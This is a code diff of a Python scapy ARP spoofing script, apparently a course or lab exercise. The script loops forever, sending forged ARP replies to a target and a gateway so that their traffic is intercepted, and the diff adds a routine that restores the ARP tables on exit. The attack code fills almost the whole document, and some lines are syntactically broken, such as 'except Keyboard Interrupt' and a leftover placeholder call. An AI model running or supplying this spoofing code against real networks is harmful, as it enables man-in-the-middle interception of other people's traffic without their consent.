@@ -22,8 +22,11 @@ def restore(destination_ip,source_ip)
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
     packet = scapy.ARP(op=2,pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-    print(packet.show())
-    print(packet.summary())
+    scapy.send(packet,count=4,verbose=False)
+
+target_ip = "10.0.2.7"
+gateway_ip = "10.0.2.1"
+
 
 sent_packets_count = 0
 
@@ -31,7 +34,7 @@ try:
 
 	while True:
 	      
-	    spoof("<ip address of target","<ip address of router")u
+	    spoof("<ip address of target","<ip address of router")
 	    spoof("<ip address of router","<ip address of target")
 	    sent_packets_count = sent_packets_count +2
 	    print("\tr [+]packets sent:" + str(sent_packets_count)),
@@ -39,4 +42,7 @@ try:
 	    time.sleep(2)
 
 except Keyboard Interrupt :
-    print("[+]Detected CTRL+C.......quitting")
+    print("[+]Detected CTRL+C.......resetting ARP table......please wait \n")
+
+    restore(target_ip,gateway_ip)
+    restore(gateway_ip,target_ip)
